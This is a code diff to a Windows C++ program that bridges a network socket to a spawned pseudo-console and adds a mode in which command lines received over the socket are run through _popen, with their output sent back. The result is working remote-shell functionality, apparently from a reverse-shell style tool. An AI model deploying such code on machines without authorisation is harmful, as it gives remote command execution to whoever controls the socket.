@@ -256,7 +256,7 @@ HANDLE StartThreadReadPipeWriteSocket(CommunicationThreadParams* pParams)
 }
 
 bool ParseReceivedBytes(char* pBytesReceived, DWORD dwNbBytesReceived, char* pBytesToHold, DWORD* pNbBytesToHold, 
-    char* pBytesToWrite, DWORD* pNbBytesToWrite, char* pPopenControlCode, DWORD dwPopenControlCodeSize, 
+    char* pBytesToWrite, DWORD* pNbBytesToWrite, char* pSwitchModeControlCode, DWORD dwSwitchControlCodeSize, 
     char* pRemainingBytes, DWORD dwRemainingBufferSize, DWORD* pNbRemainingBytes)
 {
     bool bSwitchMode = false;
@@ -264,12 +264,14 @@ bool ParseReceivedBytes(char* pBytesReceived, DWORD dwNbBytesReceived, char* pBy
     DWORD dwBytesToWrite = 0;
     for (DWORD i = 0; i < dwNbBytesReceived; ++i)
     {
-        if (dwBytesToHold < dwPopenControlCodeSize && pBytesReceived[i] == pPopenControlCode[dwBytesToHold])
+        if (dwBytesToHold < dwSwitchControlCodeSize && pBytesReceived[i] == pSwitchModeControlCode[dwBytesToHold])
         {
             pBytesToHold[dwBytesToHold++] = pBytesReceived[i];
-            if (dwBytesToHold == dwPopenControlCodeSize)
+            if (dwBytesToHold == dwSwitchControlCodeSize)
             {
                 bSwitchMode = true;
+                ZeroMemory(pBytesToHold, BUFFER_SIZE_SOCKET);
+                *pNbBytesToHold = 0;
                 *pNbRemainingBytes = min(dwNbBytesReceived - (i + 1), dwRemainingBufferSize); // 0 if i == dwBytesReceived and dwBytesReceived - 1 if i = 0
                 if (*pNbRemainingBytes > 0)
                 {
@@ -311,8 +313,6 @@ bool ReadSockWritePipe(SOCKET hSock, HANDLE hPipe, bool bOverlapped, char *pPope
     bool bSwitchMode = false;
 
     bool bWriteSuccess = false;
-    bool bSocketBlockingOperation = false;
-
     char pBytesReceived[BUFFER_SIZE_SOCKET];
     char *pBytesToHold = new char[BUFFER_SIZE_SOCKET];
     char *pBytesToWrite = new char[BUFFER_SIZE_SOCKET];
@@ -350,7 +350,10 @@ bool ReadSockWritePipe(SOCKET hSock, HANDLE hPipe, bool bOverlapped, char *pPope
                 ZeroMemory(pBytesToWrite, BUFFER_SIZE_SOCKET);
             }
                 
-        } while (dwNbBytesToHold > 0 || dwNbBytesReceived > 0 && bWriteSuccess && !bSwitchMode);
+        } while (dwNbBytesReceived > 0          // receiving 0 bytes would mean that the sockeet died
+            && !bSwitchMode                     // non switch mode command
+            && (bWriteSuccess                   // we managed to write to the pipe
+                || dwNbBytesToHold > 0));       // we are waiting for a potential switch mode command
     }
     else
     {
@@ -360,6 +363,7 @@ bool ReadSockWritePipe(SOCKET hSock, HANDLE hPipe, bool bOverlapped, char *pPope
             // we expect the socket to be non-blocking at this point. we create an asynch event to be signaled when the recv operation is ready to get some data
             if (WSAEventSelect(hSock, hReadEvent, FD_READ) == 0)
             {
+                bool bSocketBlockingOperation = false;
                 do
                 {
                     ZeroMemory(pBytesReceived, BUFFER_SIZE_SOCKET);
@@ -395,7 +399,14 @@ bool ReadSockWritePipe(SOCKET hSock, HANDLE hPipe, bool bOverlapped, char *pPope
                     {
                         bSocketBlockingOperation = true;
                     }
-                } while (bSocketBlockingOperation || dwNbBytesToHold > 0 || (dwNbBytesReceived > 0 && bWriteSuccess && !bSwitchMode));
+                } while (bSocketBlockingOperation                   // we didn't receive more bytes but the socket is still alive
+                    || (
+                        dwNbBytesReceived > 0                       // we received more bytes
+                        && !bSwitchMode                             // no switch mode command
+                        && (
+                            bWriteSuccess                           // pipe write operator was successful
+                            || dwNbBytesToHold > 0                  // we are waiting for a potential switch mode command
+                            )));
             }
             WSACloseEvent(hReadEvent);
         }
@@ -405,6 +416,60 @@ bool ReadSockWritePipe(SOCKET hSock, HANDLE hPipe, bool bOverlapped, char *pPope
     delete[] pBytesToWrite;
 
     return bSwitchMode;
+}
+
+
+bool CallPopenWriteSock(SOCKET hSock, char* pBytesToWrite, DWORD *pNbBytesToWrite, char* pPendingCommand, DWORD *pNbPendingCommandSize, DWORD* pNbBytesSent)
+{
+    bool bRes = true;
+    DWORD dwNbBytesToWrite = *pNbBytesToWrite;
+    DWORD dwPendingCommandSize = *pNbPendingCommandSize;
+    DWORD dwNbBytesSent = 0;
+    char pPopenOutput[BUFFER_SIZE_SOCKET];
+    for (DWORD i = 0; i < dwNbBytesToWrite && dwPendingCommandSize < BUFFER_SIZE_SOCKET - 1; ++i)
+    {
+        // loop stop if dwPendingCommandSize == BUFFER_SIZE_SOCKET - 1 because the last byte of the buffer is reserved for the null byte
+        if (pBytesToWrite[i] != '\r')
+        {
+            pPendingCommand[dwPendingCommandSize++] = pBytesToWrite[i];
+        }
+        else
+        {
+            pPendingCommand[dwPendingCommandSize++] = '\0'; // make sure that the buffer is null terminated
+            FILE* pPopen = _popen(pPendingCommand, "rb");
+            ZeroMemory(pPopenOutput, BUFFER_SIZE_SOCKET);
+            if (pPopen != NULL)
+            {
+                while (fgets(pPopenOutput, BUFFER_SIZE_SOCKET - 1, pPopen))
+                {
+                    dwNbBytesSent += send(hSock, pPopenOutput, strlen(pPopenOutput), NULL);
+                    ZeroMemory(pPopenOutput, BUFFER_SIZE_SOCKET);
+                    bRes = (bool)(dwNbBytesSent > 0);
+                }
+                int endOfFileVal = feof(pPopen);
+                int closeReturnVal = _pclose(pPopen);
+            }
+            else
+            {
+                bRes = false;
+            }
+            ZeroMemory(pPendingCommand, BUFFER_SIZE_SOCKET);
+            dwPendingCommandSize = 0;
+        }
+    }
+    if (dwPendingCommandSize >= BUFFER_SIZE_SOCKET - 1)
+    {
+        // we didn't receive the '\r' even after BUFFER_SIZE_SOCKET - 1 bytes
+        // we purge the pending command buffer.
+        ZeroMemory(pPendingCommand, BUFFER_SIZE_SOCKET);
+        dwPendingCommandSize = 0;
+    }
+    dwNbBytesToWrite = 0;
+    ZeroMemory(pBytesToWrite, BUFFER_SIZE_SOCKET);
+    *pNbBytesToWrite = dwNbBytesToWrite;
+    *pNbBytesSent = dwNbBytesSent;
+    *pNbPendingCommandSize = dwPendingCommandSize;
+    return bRes;
 }
 
 
@@ -420,10 +485,14 @@ bool ReadSockCallPopen(SOCKET hSock, HANDLE hPipe, bool bOverlapped, char* pPtyC
     char pBytesReceived[BUFFER_SIZE_SOCKET];
     char* pBytesToHold = new char[BUFFER_SIZE_SOCKET];
     char* pBytesToWrite = new char[BUFFER_SIZE_SOCKET];
+    char* pPendingCommand = new char[BUFFER_SIZE_SOCKET];
+    char* pPopenOutput = new char[BUFFER_SIZE_SOCKET];
     DWORD dwNbBytesReceived = 0;
     DWORD dwNbBytesToHold = 0;
     DWORD dwNbBytesToWrite = 0;
+    DWORD dwPendingCommandSize = 0;
     DWORD dwNbBytesSent = 0;
+    bool bStillAlive = false;
 
     ZeroMemory(pBytesToHold, BUFFER_SIZE_SOCKET);
     ZeroMemory(pBytesToWrite, BUFFER_SIZE_SOCKET);
@@ -432,16 +501,90 @@ bool ReadSockCallPopen(SOCKET hSock, HANDLE hPipe, bool bOverlapped, char* pPtyC
     {
         do
         {
-
-        } while (dwNbBytesToHold > 0 || dwNbBytesReceived > 0 && dwNbBytesSent > 0 && !bSwitchMode);
+            dwNbBytesReceived = 0;
+            ZeroMemory(pBytesReceived, BUFFER_SIZE_SOCKET);
+            if (*pNbRemainingBytes > 0)
+            {
+                // transfert remaining bytes to pBytesReceived buffer
+                memcpy(pBytesReceived, pRemainingBytes, *pNbRemainingBytes);
+                dwNbBytesReceived = *pNbRemainingBytes;
+                ZeroMemory(pRemainingBytes, dwRemainingBufferSize);
+                *pNbRemainingBytes = 0;
+            }
+            else
+            {
+                dwNbBytesReceived = recv(hSock, pBytesReceived, BUFFER_SIZE_SOCKET, 0);
+            }
+            bSwitchMode = ParseReceivedBytes(pBytesReceived, dwNbBytesReceived, pBytesToHold, &dwNbBytesToHold, pBytesToWrite, &dwNbBytesToWrite,
+                pPtyControlCode, dwPtyControlCodeSize, pRemainingBytes, dwRemainingBufferSize, pNbRemainingBytes);
+            if (dwNbBytesToWrite > 0)
+            {
+                bStillAlive = CallPopenWriteSock(hSock, pBytesToWrite, &dwNbBytesToWrite, pPendingCommand, &dwPendingCommandSize, &dwNbBytesSent);
+            }
+        } while (dwNbBytesReceived > 0                  // receiving 0 data mean that the socket died 
+            && !bSwitchMode                             // bSwitchMode == true mean we have to switch to pty mode
+            && (bStillAlive                             // we managed to write back data from popen in the socket or the command failed and we didn't check the socket
+                || dwNbBytesToHold > 0                  // we are currently waiting for a potentially switch mode command
+                || dwPendingCommandSize > 0));          // we are currently waiting for the end of a OS command
     }
     else
     {
-
+        HANDLE hReadEvent = WSACreateEvent();
+        if (hReadEvent != NULL && hReadEvent != INVALID_HANDLE_VALUE)
+        {
+            // we expect the socket to be non-blocking at this point. we create an asynch event to be signaled when the recv operation is ready to get some data
+            if (WSAEventSelect(hSock, hReadEvent, FD_READ) == 0)
+            {
+                bool bSocketBlockingOperation = false;
+                do
+                {
+                    ZeroMemory(pBytesReceived, BUFFER_SIZE_SOCKET);
+                    WSAWaitForMultipleEvents(1, &hReadEvent, true, 100, false);
+                    if (*pNbRemainingBytes > 0)
+                    {
+                        // transfert remaining bytes to pBytesReceived buffer
+                        memcpy(pBytesReceived, pRemainingBytes, *pNbRemainingBytes);
+                        dwNbBytesReceived = *pNbRemainingBytes;
+                        ZeroMemory(pRemainingBytes, dwRemainingBufferSize);
+                        *pNbRemainingBytes = 0;
+                        WSASetLastError(0); // clear the last error so that we are sure to get in the next if block that check WSAGetLastError()
+                    }
+                    else
+                    {
+                        dwNbBytesReceived = recv(hSock, pBytesReceived, BUFFER_SIZE_SOCKET, 0);
+                    }
+                    // we still check WSAEWOULDBLOCK for a more robust implementation
+                    if (WSAGetLastError() != WSAEWOULDBLOCK)
+                    {
+                        WSAResetEvent(hReadEvent);
+                        bSocketBlockingOperation = false;
+                        bSwitchMode = ParseReceivedBytes(pBytesReceived, dwNbBytesReceived, pBytesToHold, &dwNbBytesToHold, pBytesToWrite, &dwNbBytesToWrite,
+                            pPtyControlCode, dwPtyControlCodeSize, pRemainingBytes, dwRemainingBufferSize, pNbRemainingBytes);
+                        if (dwNbBytesToWrite > 0)
+                        {
+                            bStillAlive = CallPopenWriteSock(hSock, pBytesToWrite, &dwNbBytesToWrite, pPendingCommand, &dwPendingCommandSize, &dwNbBytesSent);
+                        }
+                    }
+                    else
+                    {
+                        bSocketBlockingOperation = true;
+                    }
+                } while (bSocketBlockingOperation                   // we didn't receive more bytes but the socket is still alive
+                    || (
+                        dwNbBytesReceived > 0                       // we received more bytes
+                        && !bSwitchMode                             // no switch mode command
+                        && (bStillAlive                             // we managed to write back data from popen in the socket or the command failed and we didn't check the socket
+                            || dwNbBytesToHold > 0                  // we are currently waiting for a potentially switch mode command
+                            || dwPendingCommandSize > 0)));         // we are currently waiting for the end of a OS command
+            }
+            WSACloseEvent(hReadEvent);
+        }
     }
 
     delete[] pBytesToHold;
     delete[] pBytesToWrite;
+    delete[] pPendingCommand;
+    delete[] pPopenOutput;
 
     return bSwitchMode;
 }
@@ -456,9 +599,9 @@ DWORD WINAPI ThreadReadSocketWritePipe(LPVOID lpParams)
     HANDLE hBlockWriteSockThread = pThreadParams->hBlockWriteSockThread;
     bool bOverlapped = pThreadParams->bOverlapped;
     char* pPopenControlCode = pThreadParams->pPopenControlCode;
-    DWORD dwPopenControlCodeSize = (DWORD)min(strlen(pPopenControlCode) - 1, BUFFER_SIZE_SOCKET);
+    DWORD dwPopenControlCodeSize = (DWORD)min(strlen(pPopenControlCode), BUFFER_SIZE_SOCKET);
     char* pPtyControlCode = pThreadParams->pPtyControlCode;
-    DWORD dwPtyControlCodeSize = (DWORD)min(strlen(pPtyControlCode) - 1, BUFFER_SIZE_SOCKET);
+    DWORD dwPtyControlCodeSize = (DWORD)min(strlen(pPtyControlCode), BUFFER_SIZE_SOCKET);
     bool bPopenMode = false; // by default we're in pty mode
     bool bSwitchMode = false; // loop control flag
     char pRemainingBytes[BUFFER_SIZE_SOCKET];
@@ -474,7 +617,7 @@ DWORD WINAPI ThreadReadSocketWritePipe(LPVOID lpParams)
             CString csCwd;
             bool bRes = GetProcessCwd(pThreadParams->piInfo.dwProcessId, csCwd);
             SetCurrentDirectory(csCwd);
-            bSwitchMode = ReadSockCallPopen(hSock, hPipe, bOverlapped, pPopenControlCode, dwPopenControlCodeSize,
+            bSwitchMode = ReadSockCallPopen(hSock, hPipe, bOverlapped, pPtyControlCode, dwPtyControlCodeSize,
                 pRemainingBytes, BUFFER_SIZE_SOCKET, &dwNbRemainingBytes);
             SetEvent(hBlockWriteSockThread); // Signal the event to unblock the ReadPipeWriteSock thread
         }
@@ -485,8 +628,6 @@ DWORD WINAPI ThreadReadSocketWritePipe(LPVOID lpParams)
         }
         bPopenMode = !bPopenMode;
     } while (bSwitchMode);
-    
-    
     
     TerminateProcess(hChildProcess, 0);
     return 0;
@@ -653,8 +794,6 @@ HRESULT SpawnPty(CString csCommandLine, DWORD dwRows, DWORD dwCols, char* pPopen
                                     //cleanup everything
                                     TerminateThread(hThreadReadPipeWriteSocket, 0);
                                     TerminateThread(hThreadReadSocketWritePipe, 0);
-                                    delete[] pPopenControlCode;
-                                    delete[] pPtyControlCode;
                                     if (!bOverlapped)
                                     {
                                         // cancelling the event selection for the socket
